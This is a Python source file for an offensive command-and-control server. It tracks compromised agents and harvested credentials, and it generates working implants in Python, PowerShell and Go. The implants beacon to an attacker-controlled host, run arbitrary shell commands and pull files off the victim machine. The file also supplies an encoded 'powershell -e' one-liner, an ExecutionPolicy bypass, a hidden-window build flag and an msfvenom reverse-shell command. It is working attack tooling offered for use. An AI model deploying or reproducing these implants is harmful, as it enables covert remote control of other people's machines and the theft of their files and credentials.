"""
Advanced C2 (Command & Control) Framework
Mythic/Sliver-style modular C2 with multi-protocol support.
"""
import os
import json
import uuid
import time
import base64
import hashlib
import secrets
import sqlite3
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any
from enum import Enum
import threading


class AgentStatus(Enum):
    ACTIVE = "active"
    DORMANT = "dormant"
    DEAD = "dead"
    INITIALIZING = "initializing"


class TaskStatus(Enum):
    PENDING = "pending"
    SENT = "sent"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


class ListenerType(Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    WEBSOCKET = "websocket"
    MTLS = "mtls"
    TCP = "tcp"


@dataclass
class Agent:
    """C2 Agent/Beacon representation."""
    agent_id: str
    hostname: str
    username: str
    os_info: str
    arch: str
    pid: int
    listener_id: str
    first_seen: str
    last_seen: str
    status: str = "active"
    ip_address: str = ""
    integrity: str = "medium"  # low, medium, high, system
    sleep_interval: int = 5
    jitter: int = 10
    extra_info: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return asdict(self)
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'Agent':
        return cls(**data)


@dataclass
class Task:
    """Task to be executed by an agent."""
    task_id: str
    agent_id: str
    command: str
    args: List[str]
    created_at: str
    status: str = "pending"
    output: str = ""
    completed_at: str = ""
    error: str = ""
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class Listener:
    """C2 Listener configuration."""
    listener_id: str
    name: str
    listener_type: str
    host: str
    port: int
    created_at: str
    status: str = "stopped"
    ssl_cert: str = ""
    ssl_key: str = ""
    options: Dict = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return asdict(self)


class C2Database:
    """SQLite database for C2 data persistence."""
    
    def __init__(self, db_path: str = "/tmp/c2_framework.db"):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        """Initialize database schema."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Agents table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS agents (
                agent_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os_info TEXT,
                arch TEXT,
                pid INTEGER,
                listener_id TEXT,
                ip_address TEXT,
                integrity TEXT,
                sleep_interval INTEGER,
                jitter INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT,
                extra_info TEXT
            )
        """)
        
        # Tasks table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                task_id TEXT PRIMARY KEY,
                agent_id TEXT,
                command TEXT,
                args TEXT,
                status TEXT,
                output TEXT,
                error TEXT,
                created_at TEXT,
                completed_at TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            )
        """)
        
        # Listeners table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS listeners (
                listener_id TEXT PRIMARY KEY,
                name TEXT,
                listener_type TEXT,
                host TEXT,
                port INTEGER,
                status TEXT,
                ssl_cert TEXT,
                ssl_key TEXT,
                options TEXT,
                created_at TEXT
            )
        """)
        
        # Credentials table (harvested)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS c2_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                cred_type TEXT,
                domain TEXT,
                username TEXT,
                password TEXT,
                hash TEXT,
                source TEXT,
                created_at TEXT
            )
        """)
        
        # Downloads table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS downloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                remote_path TEXT,
                local_path TEXT,
                size INTEGER,
                hash TEXT,
                created_at TEXT
            )
        """)
        
        conn.commit()
        conn.close()
    
    def _get_conn(self):
        return sqlite3.connect(self.db_path)
    
    # Agent operations
    def add_agent(self, agent: Agent) -> bool:
        conn = self._get_conn()
        try:
            conn.execute("""
                INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                agent.agent_id, agent.hostname, agent.username, agent.os_info,
                agent.arch, agent.pid, agent.listener_id, agent.ip_address,
                agent.integrity, agent.sleep_interval, agent.jitter,
                agent.first_seen, agent.last_seen, agent.status,
                json.dumps(agent.extra_info)
            ))
            conn.commit()
            return True
        finally:
            conn.close()
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        conn = self._get_conn()
        try:
            cursor = conn.execute("SELECT * FROM agents WHERE agent_id = ?", (agent_id,))
            row = cursor.fetchone()
            if row:
                return Agent(
                    agent_id=row[0], hostname=row[1], username=row[2],
                    os_info=row[3], arch=row[4], pid=row[5],
                    listener_id=row[6], ip_address=row[7], integrity=row[8],
                    sleep_interval=row[9], jitter=row[10], first_seen=row[11],
                    last_seen=row[12], status=row[13],
                    extra_info=json.loads(row[14]) if row[14] else {}
                )
            return None
        finally:
            conn.close()
    
    def list_agents(self, status: str = None) -> List[Agent]:
        conn = self._get_conn()
        try:
            if status:
                cursor = conn.execute("SELECT * FROM agents WHERE status = ?", (status,))
            else:
                cursor = conn.execute("SELECT * FROM agents")
            
            agents = []
            for row in cursor.fetchall():
                agents.append(Agent(
                    agent_id=row[0], hostname=row[1], username=row[2],
                    os_info=row[3], arch=row[4], pid=row[5],
                    listener_id=row[6], ip_address=row[7], integrity=row[8],
                    sleep_interval=row[9], jitter=row[10], first_seen=row[11],
                    last_seen=row[12], status=row[13],
                    extra_info=json.loads(row[14]) if row[14] else {}
                ))
            return agents
        finally:
            conn.close()
    
    def update_agent_status(self, agent_id: str, status: str):
        conn = self._get_conn()
        try:
            conn.execute(
                "UPDATE agents SET status = ?, last_seen = ? WHERE agent_id = ?",
                (status, datetime.utcnow().isoformat(), agent_id)
            )
            conn.commit()
        finally:
            conn.close()
    
    def agent_checkin(self, agent_id: str):
        """Update agent last seen time."""
        conn = self._get_conn()
        try:
            conn.execute(
                "UPDATE agents SET last_seen = ?, status = 'active' WHERE agent_id = ?",
                (datetime.utcnow().isoformat(), agent_id)
            )
            conn.commit()
        finally:
            conn.close()
    
    # Task operations
    def add_task(self, task: Task) -> bool:
        conn = self._get_conn()
        try:
            conn.execute("""
                INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                task.task_id, task.agent_id, task.command,
                json.dumps(task.args), task.status, task.output,
                task.error, task.created_at, task.completed_at
            ))
            conn.commit()
            return True
        finally:
            conn.close()
    
    def get_pending_tasks(self, agent_id: str) -> List[Task]:
        conn = self._get_conn()
        try:
            cursor = conn.execute(
                "SELECT * FROM tasks WHERE agent_id = ? AND status = 'pending'",
                (agent_id,)
            )
            tasks = []
            for row in cursor.fetchall():
                tasks.append(Task(
                    task_id=row[0], agent_id=row[1], command=row[2],
                    args=json.loads(row[3]), status=row[4], output=row[5],
                    error=row[6], created_at=row[7], completed_at=row[8]
                ))
            return tasks
        finally:
            conn.close()
    
    def update_task(self, task_id: str, status: str, output: str = "", error: str = ""):
        conn = self._get_conn()
        try:
            conn.execute("""
                UPDATE tasks SET status = ?, output = ?, error = ?, completed_at = ?
                WHERE task_id = ?
            """, (status, output, error, datetime.utcnow().isoformat(), task_id))
            conn.commit()
        finally:
            conn.close()
    
    def get_task(self, task_id: str) -> Optional[Task]:
        conn = self._get_conn()
        try:
            cursor = conn.execute("SELECT * FROM tasks WHERE task_id = ?", (task_id,))
            row = cursor.fetchone()
            if row:
                return Task(
                    task_id=row[0], agent_id=row[1], command=row[2],
                    args=json.loads(row[3]), status=row[4], output=row[5],
                    error=row[6], created_at=row[7], completed_at=row[8]
                )
            return None
        finally:
            conn.close()
    
    def list_tasks(self, agent_id: str = None) -> List[Task]:
        conn = self._get_conn()
        try:
            if agent_id:
                cursor = conn.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY created_at DESC", (agent_id,))
            else:
                cursor = conn.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100")
            
            tasks = []
            for row in cursor.fetchall():
                tasks.append(Task(
                    task_id=row[0], agent_id=row[1], command=row[2],
                    args=json.loads(row[3]), status=row[4], output=row[5],
                    error=row[6], created_at=row[7], completed_at=row[8]
                ))
            return tasks
        finally:
            conn.close()
    
    # Listener operations
    def add_listener(self, listener: Listener) -> bool:
        conn = self._get_conn()
        try:
            conn.execute("""
                INSERT INTO listeners VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                listener.listener_id, listener.name, listener.listener_type,
                listener.host, listener.port, listener.status,
                listener.ssl_cert, listener.ssl_key,
                json.dumps(listener.options), listener.created_at
            ))
            conn.commit()
            return True
        finally:
            conn.close()
    
    def get_listener(self, listener_id: str) -> Optional[Listener]:
        conn = self._get_conn()
        try:
            cursor = conn.execute("SELECT * FROM listeners WHERE listener_id = ?", (listener_id,))
            row = cursor.fetchone()
            if row:
                return Listener(
                    listener_id=row[0], name=row[1], listener_type=row[2],
                    host=row[3], port=row[4], status=row[5],
                    ssl_cert=row[6], ssl_key=row[7],
                    options=json.loads(row[8]) if row[8] else {},
                    created_at=row[9]
                )
            return None
        finally:
            conn.close()
    
    def list_listeners(self) -> List[Listener]:
        conn = self._get_conn()
        try:
            cursor = conn.execute("SELECT * FROM listeners")
            listeners = []
            for row in cursor.fetchall():
                listeners.append(Listener(
                    listener_id=row[0], name=row[1], listener_type=row[2],
                    host=row[3], port=row[4], status=row[5],
                    ssl_cert=row[6], ssl_key=row[7],
                    options=json.loads(row[8]) if row[8] else {},
                    created_at=row[9]
                ))
            return listeners
        finally:
            conn.close()
    
    def update_listener_status(self, listener_id: str, status: str):
        conn = self._get_conn()
        try:
            conn.execute(
                "UPDATE listeners SET status = ? WHERE listener_id = ?",
                (status, listener_id)
            )
            conn.commit()
        finally:
            conn.close()
    
    def delete_listener(self, listener_id: str):
        conn = self._get_conn()
        try:
            conn.execute("DELETE FROM listeners WHERE listener_id = ?", (listener_id,))
            conn.commit()
        finally:
            conn.close()
    
    # Credential operations
    def add_credential(self, agent_id: str, cred_type: str, domain: str,
                      username: str, password: str = "", hash_value: str = "",
                      source: str = ""):
        conn = self._get_conn()
        try:
            conn.execute("""
                INSERT INTO c2_credentials (agent_id, cred_type, domain, username, password, hash, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (agent_id, cred_type, domain, username, password, hash_value, source, datetime.utcnow().isoformat()))
            conn.commit()
        finally:
            conn.close()
    
    def list_credentials(self) -> List[Dict]:
        conn = self._get_conn()
        try:
            cursor = conn.execute("SELECT * FROM c2_credentials ORDER BY created_at DESC")
            return [
                {
                    'id': row[0], 'agent_id': row[1], 'cred_type': row[2],
                    'domain': row[3], 'username': row[4], 'password': row[5],
                    'hash': row[6], 'source': row[7], 'created_at': row[8]
                }
                for row in cursor.fetchall()
            ]
        finally:
            conn.close()


class C2Server:
    """
    Main C2 Server class.
    Manages agents, tasks, listeners, and beacon communication.
    """
    
    def __init__(self, db_path: str = "/tmp/c2_framework.db"):
        self.db = C2Database(db_path)
        self.active_listeners: Dict[str, Any] = {}
        self._encryption_key = secrets.token_bytes(32)
    
    # Listener Management
    def create_listener(self, name: str, listener_type: str, host: str, port: int,
                       options: Dict = None) -> Listener:
        """Create a new listener."""
        listener = Listener(
            listener_id=str(uuid.uuid4()),
            name=name,
            listener_type=listener_type,
            host=host,
            port=port,
            created_at=datetime.utcnow().isoformat(),
            status="stopped",
            options=options or {}
        )
        self.db.add_listener(listener)
        return listener
    
    def start_listener(self, listener_id: str) -> bool:
        """Start a listener (placeholder for actual implementation)."""
        listener = self.db.get_listener(listener_id)
        if not listener:
            return False
        
        # In production, this would actually start the listener
        # For now, we just update the status
        self.db.update_listener_status(listener_id, "running")
        return True
    
    def stop_listener(self, listener_id: str) -> bool:
        """Stop a listener."""
        self.db.update_listener_status(listener_id, "stopped")
        if listener_id in self.active_listeners:
            del self.active_listeners[listener_id]
        return True
    
    def delete_listener(self, listener_id: str) -> bool:
        """Delete a listener."""
        self.stop_listener(listener_id)
        self.db.delete_listener(listener_id)
        return True
    
    def list_listeners(self) -> List[Listener]:
        """List all listeners."""
        return self.db.list_listeners()
    
    # Agent Management
    def register_agent(self, hostname: str, username: str, os_info: str,
                      arch: str, pid: int, listener_id: str,
                      ip_address: str = "", integrity: str = "medium") -> Agent:
        """Register a new agent."""
        agent = Agent(
            agent_id=str(uuid.uuid4()),
            hostname=hostname,
            username=username,
            os_info=os_info,
            arch=arch,
            pid=pid,
            listener_id=listener_id,
            ip_address=ip_address,
            integrity=integrity,
            first_seen=datetime.utcnow().isoformat(),
            last_seen=datetime.utcnow().isoformat(),
            status="active"
        )
        self.db.add_agent(agent)
        return agent
    
    def agent_checkin(self, agent_id: str) -> List[Task]:
        """
        Handle agent check-in.
        Returns pending tasks for the agent.
        """
        self.db.agent_checkin(agent_id)
        tasks = self.db.get_pending_tasks(agent_id)
        
        # Mark tasks as sent
        for task in tasks:
            self.db.update_task(task.task_id, "sent")
        
        return tasks
    
    def task_result(self, agent_id: str, task_id: str, output: str,
                   status: str = "completed", error: str = "") -> bool:
        """Process task result from agent."""
        self.db.update_task(task_id, status, output, error)
        return True
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        """Get agent by ID."""
        return self.db.get_agent(agent_id)
    
    def list_agents(self, status: str = None) -> List[Agent]:
        """List all agents."""
        return self.db.list_agents(status)
    
    def kill_agent(self, agent_id: str) -> bool:
        """Mark agent as dead and send exit task."""
        self.db.update_agent_status(agent_id, "dead")
        self.create_task(agent_id, "exit", [])
        return True
    
    # Task Management
    def create_task(self, agent_id: str, command: str, args: List[str] = None) -> Task:
        """Create a new task for an agent."""
        task = Task(
            task_id=str(uuid.uuid4()),
            agent_id=agent_id,
            command=command,
            args=args or [],
            created_at=datetime.utcnow().isoformat(),
            status="pending"
        )
        self.db.add_task(task)
        return task
    
    def get_task(self, task_id: str) -> Optional[Task]:
        """Get task by ID."""
        return self.db.get_task(task_id)
    
    def list_tasks(self, agent_id: str = None) -> List[Task]:
        """List tasks."""
        return self.db.list_tasks(agent_id)
    
    def cancel_task(self, task_id: str) -> bool:
        """Cancel a pending task."""
        task = self.db.get_task(task_id)
        if task and task.status == "pending":
            self.db.update_task(task_id, "cancelled")
            return True
        return False
    
    # Credential Management
    def add_credential(self, agent_id: str, cred_type: str, domain: str,
                      username: str, password: str = "", hash_value: str = "",
                      source: str = ""):
        """Add a harvested credential."""
        self.db.add_credential(agent_id, cred_type, domain, username, password, hash_value, source)
    
    def list_credentials(self) -> List[Dict]:
        """List all credentials."""
        return self.db.list_credentials()
    
    # Payload Generation
    def generate_payload(self, listener_id: str, payload_type: str,
                        options: Dict = None) -> Dict:
        """Generate an implant payload."""
        listener = self.db.get_listener(listener_id)
        if not listener:
            return {"success": False, "error": "Listener not found"}
        
        options = options or {}
        
        if payload_type == "python":
            return self._generate_python_payload(listener, options)
        elif payload_type == "powershell":
            return self._generate_powershell_payload(listener, options)
        elif payload_type == "go":
            return self._generate_go_payload(listener, options)
        elif payload_type == "shellcode":
            return self._generate_shellcode_payload(listener, options)
        else:
            return {"success": False, "error": f"Unknown payload type: {payload_type}"}
    
    def _generate_python_payload(self, listener: Listener, options: Dict) -> Dict:
        """Generate Python implant."""
        sleep_interval = options.get('sleep', 5)
        jitter = options.get('jitter', 10)
        
        payload = f'''#!/usr/bin/env python3
"""
Shadow Arsenal - Python Beacon
Auto-generated implant for C2 communication
"""
import os
import sys
import json
import time
import uuid
import base64
import socket
import random
import platform
import subprocess
import urllib.request
import urllib.error

C2_HOST = "{listener.host}"
C2_PORT = {listener.port}
SLEEP_INTERVAL = {sleep_interval}
JITTER = {jitter}
AGENT_ID = None

def get_system_info():
    return {{
        "hostname": socket.gethostname(),
        "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "pid": os.getpid()
    }}

def beacon_register():
    global AGENT_ID
    info = get_system_info()
    data = json.dumps(info).encode()
    
    req = urllib.request.Request(
        f"http://{{C2_HOST}}:{{C2_PORT}}/c2/beacon/register",
        data=data,
        headers={{"Content-Type": "application/json"}}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read().decode())
            AGENT_ID = result.get("agent_id")
            return True
    except Exception as e:
        return False

def beacon_checkin():
    if not AGENT_ID:
        return []
    
    data = json.dumps({{"agent_id": AGENT_ID}}).encode()
    req = urllib.request.Request(
        f"http://{{C2_HOST}}:{{C2_PORT}}/c2/beacon/checkin",
        data=data,
        headers={{"Content-Type": "application/json"}}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read().decode())
            return result.get("tasks", [])
    except:
        return []

def execute_task(task):
    task_id = task.get("task_id")
    command = task.get("command")
    args = task.get("args", [])
    
    output = ""
    error = ""
    status = "completed"
    
    try:
        if command == "shell":
            cmd = " ".join(args) if args else "whoami"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
            output = result.stdout.decode() + result.stderr.decode()
        elif command == "pwd":
            output = os.getcwd()
        elif command == "cd":
            if args:
                os.chdir(args[0])
                output = os.getcwd()
        elif command == "ls":
            path = args[0] if args else "."
            output = "\\n".join(os.listdir(path))
        elif command == "cat":
            if args:
                with open(args[0], "r") as f:
                    output = f.read()
        elif command == "download":
            if args:
                with open(args[0], "rb") as f:
                    output = base64.b64encode(f.read()).decode()
        elif command == "upload":
            if len(args) >= 2:
                content = base64.b64decode(args[1])
                with open(args[0], "wb") as f:
                    f.write(content)
                output = f"Uploaded to {{args[0]}}"
        elif command == "exit":
            sys.exit(0)
        else:
            error = f"Unknown command: {{command}}"
            status = "failed"
    except Exception as e:
        error = str(e)
        status = "failed"
    
    return task_id, output, error, status

def send_result(task_id, output, error, status):
    data = json.dumps({{
        "agent_id": AGENT_ID,
        "task_id": task_id,
        "output": output,
        "error": error,
        "status": status
    }}).encode()
    
    req = urllib.request.Request(
        f"http://{{C2_HOST}}:{{C2_PORT}}/c2/beacon/result",
        data=data,
        headers={{"Content-Type": "application/json"}}
    )
    
    try:
        urllib.request.urlopen(req, timeout=30)
    except:
        pass

def main():
    while not beacon_register():
        time.sleep(random.randint(5, 15))
    
    while True:
        tasks = beacon_checkin()
        
        for task in tasks:
            task_id, output, error, status = execute_task(task)
            send_result(task_id, output, error, status)
        
        jitter_time = random.randint(0, JITTER)
        time.sleep(SLEEP_INTERVAL + jitter_time)

if __name__ == "__main__":
    main()
'''
        
        return {
            "success": True,
            "payload_type": "python",
            "payload": payload,
            "filename": "beacon.py",
            "instructions": f"Run with: python3 beacon.py"
        }
    
    def _generate_powershell_payload(self, listener: Listener, options: Dict) -> Dict:
        """Generate PowerShell implant."""
        sleep_interval = options.get('sleep', 5)
        
        payload = f'''# Shadow Arsenal - PowerShell Beacon
$C2Host = "{listener.host}"
$C2Port = {listener.port}
$SleepInterval = {sleep_interval}
$AgentId = $null

function Get-SystemInfo {{
    @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = [System.Environment]::OSVersion.VersionString
        arch = $env:PROCESSOR_ARCHITECTURE
        pid = $PID
    }} | ConvertTo-Json
}}

function Register-Agent {{
    $info = Get-SystemInfo
    try {{
        $response = Invoke-RestMethod -Uri "http://$C2Host`:$C2Port/c2/beacon/register" -Method POST -Body $info -ContentType "application/json"
        $script:AgentId = $response.agent_id
        return $true
    }} catch {{
        return $false
    }}
}}

function Get-Tasks {{
    if (-not $AgentId) {{ return @() }}
    try {{
        $body = @{{ agent_id = $AgentId }} | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "http://$C2Host`:$C2Port/c2/beacon/checkin" -Method POST -Body $body -ContentType "application/json"
        return $response.tasks
    }} catch {{
        return @()
    }}
}}

function Execute-Task {{
    param($task)
    $output = ""
    $error = ""
    $status = "completed"
    
    try {{
        switch ($task.command) {{
            "shell" {{ $output = Invoke-Expression ($task.args -join " ") | Out-String }}
            "pwd" {{ $output = Get-Location | Out-String }}
            "ls" {{ $output = Get-ChildItem $task.args[0] | Out-String }}
            "cat" {{ $output = Get-Content $task.args[0] | Out-String }}
            "exit" {{ exit }}
            default {{ $error = "Unknown command"; $status = "failed" }}
        }}
    }} catch {{
        $error = $_.Exception.Message
        $status = "failed"
    }}
    
    return @{{ task_id = $task.task_id; output = $output; error = $error; status = $status }}
}}

function Send-Result {{
    param($result)
    $body = @{{
        agent_id = $AgentId
        task_id = $result.task_id
        output = $result.output
        error = $result.error
        status = $result.status
    }} | ConvertTo-Json
    
    try {{
        Invoke-RestMethod -Uri "http://$C2Host`:$C2Port/c2/beacon/result" -Method POST -Body $body -ContentType "application/json"
    }} catch {{}}
}}

# Main loop
while (-not (Register-Agent)) {{ Start-Sleep -Seconds (Get-Random -Min 5 -Max 15) }}

while ($true) {{
    $tasks = Get-Tasks
    foreach ($task in $tasks) {{
        $result = Execute-Task -task $task
        Send-Result -result $result
    }}
    Start-Sleep -Seconds ($SleepInterval + (Get-Random -Min 0 -Max 5))
}}
'''
        
        # Base64 encode for easy deployment
        encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
        one_liner = f'powershell -e {encoded}'
        
        return {
            "success": True,
            "payload_type": "powershell",
            "payload": payload,
            "encoded": one_liner,
            "filename": "beacon.ps1",
            "instructions": "Run with: powershell -ExecutionPolicy Bypass -File beacon.ps1"
        }
    
    def _generate_go_payload(self, listener: Listener, options: Dict) -> Dict:
        """Generate Go implant source."""
        sleep_interval = options.get('sleep', 5)
        
        payload = f'''package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

const (
    C2Host = "{listener.host}"
    C2Port = {listener.port}
    SleepInterval = {sleep_interval}
)

var AgentID string

type SystemInfo struct {{
    Hostname string `json:"hostname"`
    Username string `json:"username"`
    OS       string `json:"os"`
    Arch     string `json:"arch"`
    PID      int    `json:"pid"`
}}

type Task struct {{
    TaskID  string   `json:"task_id"`
    Command string   `json:"command"`
    Args    []string `json:"args"`
}}

func getSystemInfo() SystemInfo {{
    hostname, _ := os.Hostname()
    currentUser, _ := user.Current()
    return SystemInfo{{
        Hostname: hostname,
        Username: currentUser.Username,
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
        PID:      os.Getpid(),
    }}
}}

func register() bool {{
    info := getSystemInfo()
    data, _ := json.Marshal(info)
    
    resp, err := http.Post(
        fmt.Sprintf("http://%s:%d/c2/beacon/register", C2Host, C2Port),
        "application/json",
        bytes.NewBuffer(data),
    )
    if err != nil {{
        return false
    }}
    defer resp.Body.Close()
    
    var result map[string]interface{{}}
    json.NewDecoder(resp.Body).Decode(&result)
    if id, ok := result["agent_id"].(string); ok {{
        AgentID = id
        return true
    }}
    return false
}}

func checkin() []Task {{
    data, _ := json.Marshal(map[string]string{{"agent_id": AgentID}})
    
    resp, err := http.Post(
        fmt.Sprintf("http://%s:%d/c2/beacon/checkin", C2Host, C2Port),
        "application/json",
        bytes.NewBuffer(data),
    )
    if err != nil {{
        return nil
    }}
    defer resp.Body.Close()
    
    var result map[string]interface{{}}
    json.NewDecoder(resp.Body).Decode(&result)
    
    var tasks []Task
    if t, ok := result["tasks"].([]interface{{}}); ok {{
        for _, item := range t {{
            if m, ok := item.(map[string]interface{{}}); ok {{
                task := Task{{
                    TaskID:  m["task_id"].(string),
                    Command: m["command"].(string),
                }}
                if args, ok := m["args"].([]interface{{}}); ok {{
                    for _, a := range args {{
                        task.Args = append(task.Args, a.(string))
                    }}
                }}
                tasks = append(tasks, task)
            }}
        }}
    }}
    return tasks
}}

func executeTask(task Task) (string, string, string) {{
    var output, errMsg string
    status := "completed"
    
    switch task.Command {{
    case "shell":
        cmd := exec.Command("sh", "-c", task.Args[0])
        if runtime.GOOS == "windows" {{
            cmd = exec.Command("cmd", "/c", task.Args[0])
        }}
        out, err := cmd.CombinedOutput()
        output = string(out)
        if err != nil {{
            errMsg = err.Error()
        }}
    case "pwd":
        dir, _ := os.Getwd()
        output = dir
    case "ls":
        path := "."
        if len(task.Args) > 0 {{
            path = task.Args[0]
        }}
        files, _ := ioutil.ReadDir(path)
        for _, f := range files {{
            output += f.Name() + "\\n"
        }}
    case "exit":
        os.Exit(0)
    default:
        errMsg = "Unknown command"
        status = "failed"
    }}
    
    return output, errMsg, status
}}

func sendResult(taskID, output, errMsg, status string) {{
    data, _ := json.Marshal(map[string]string{{
        "agent_id": AgentID,
        "task_id":  taskID,
        "output":   output,
        "error":    errMsg,
        "status":   status,
    }})
    
    http.Post(
        fmt.Sprintf("http://%s:%d/c2/beacon/result", C2Host, C2Port),
        "application/json",
        bytes.NewBuffer(data),
    )
}}

func main() {{
    for !register() {{
        time.Sleep(time.Duration(5+time.Now().UnixNano()%10) * time.Second)
    }}
    
    for {{
        tasks := checkin()
        for _, task := range tasks {{
            output, errMsg, status := executeTask(task)
            sendResult(task.TaskID, output, errMsg, status)
        }}
        time.Sleep(time.Duration(SleepInterval) * time.Second)
    }}
}}
'''
        
        return {
            "success": True,
            "payload_type": "go",
            "payload": payload,
            "filename": "beacon.go",
            "instructions": "Compile with: GOOS=windows GOARCH=amd64 go build -ldflags '-s -w -H windowsgui' -o beacon.exe beacon.go"
        }
    
    def _generate_shellcode_payload(self, listener: Listener, options: Dict) -> Dict:
        """Generate shellcode (placeholder - would use msfvenom in production)."""
        return {
            "success": True,
            "payload_type": "shellcode",
            "payload": "# Shellcode generation requires msfvenom",
            "instructions": f"Use: msfvenom -p windows/x64/meterpreter/reverse_https LHOST={listener.host} LPORT={listener.port} -f c"
        }
    
    def get_payload_types(self) -> List[Dict]:
        """Get available payload types."""
        return [
            {"id": "python", "name": "Python", "platforms": ["linux", "windows", "macos"]},
            {"id": "powershell", "name": "PowerShell", "platforms": ["windows"]},
            {"id": "go", "name": "Go (Cross-platform)", "platforms": ["linux", "windows", "macos"]},
            {"id": "shellcode", "name": "Shellcode", "platforms": ["windows"]},
        ]


# Global C2 server instance
_c2_server: Optional[C2Server] = None


def get_c2_server() -> C2Server:
    """Get or create C2 server instance."""
    global _c2_server
    if _c2_server is None:
        _c2_server = C2Server()
    return _c2_server
